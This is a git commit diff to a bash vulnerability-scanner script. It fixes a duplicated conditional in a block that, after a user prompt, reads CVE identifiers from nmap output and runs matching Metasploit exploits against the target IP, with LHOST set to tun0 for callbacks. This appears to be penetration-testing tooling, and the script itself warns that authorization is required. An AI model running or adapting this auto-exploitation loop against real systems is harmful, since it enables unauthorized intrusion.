89af1374a7a74fcc1bcb4a754b2e8be5058b1879
HarveyGW <45942623+HarveyGW@users.noreply.github.com>
2023-03-10 00:57:28 +0000

    Update Vuln_Scanner.sh

--- Vuln_Scanner.sh
+++ Vuln_Scanner.sh
@@ -154,14 +154,13 @@ fi
 
 # Execute discovered exploits (use with caution and proper authorization!)
 read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
-if [[ $executeExploits =~ ^[yY]$ ]]
-if [[ $executeExploits =~ ^[yY]$ ]]
-then
+if [[ $executeExploits =~ ^[yY]$ ]]; then
     while read -r line
     do
         exploitPath=$(echo "$line" | cut -d ":" -f 1)
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
         msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
-     done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
+    done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
 fi
+
